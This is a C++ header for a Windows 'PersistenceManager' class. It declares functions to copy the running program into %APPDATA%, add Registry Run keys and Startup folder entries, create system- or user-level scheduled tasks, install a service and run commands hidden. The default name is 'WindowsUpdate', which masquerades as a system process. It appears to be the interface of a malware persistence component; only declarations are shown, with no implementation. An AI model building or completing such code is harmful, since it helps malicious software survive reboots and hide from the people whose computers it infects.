#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <string>
#include <windows.h>

class PersistenceManager {
private:
    PersistenceManager() {}
    ~PersistenceManager() {}

public:
    static PersistenceManager& getInstance() {
        static PersistenceManager instance;
        return instance;
    }

    // Full install: copies self to %APPDATA%, adds Registry Run key,
    // creates a Scheduled Task (System-level if admin, else User-level).
    // Returns true if at least one persistence mechanism is active.
    bool install(const std::string& name = "WindowsUpdate");

    // Remove all persistence: Registry, Startup folder, Scheduled Task, copy.
    bool remove(const std::string& name = "WindowsUpdate");

    // Check if any persistence mechanism is currently active.
    bool is_persisted(const std::string& name = "WindowsUpdate");

    // Legacy API kept for compatibility with existing callers.
    bool add_to_startup(const std::string& name);
    bool remove_from_startup(const std::string& name);
    bool create_scheduled_task(const std::string& name, const std::string& command);
    bool install_as_service(const std::string& name, const std::string& display_name);

private:
    // Helpers
    static std::string get_self_path();
    static std::string get_target_path();
    static bool copy_self_to(const std::string& dest);
    static bool file_exists(const std::string& path);

    // Registry
    static bool install_registry_run(const std::string& name, const std::string& exe);
    static bool remove_registry_run(const std::string& name);
    static bool registry_run_exists(const std::string& name);

    // Startup folder
    static bool install_startup_folder(const std::string& exe);
    static bool remove_startup_folder();

    // Scheduled Task — returns true on success
    static bool create_task_system(const std::string& name, const std::string& exe);
    static bool create_task_user(const std::string& name, const std::string& exe);
    static bool delete_task(const std::string& name);
    static bool task_exists(const std::string& name);

    // Process helper: runs a command hidden, returns exit code (-1 on failure)
    static int run_hidden(const std::string& cmd);
};

#endif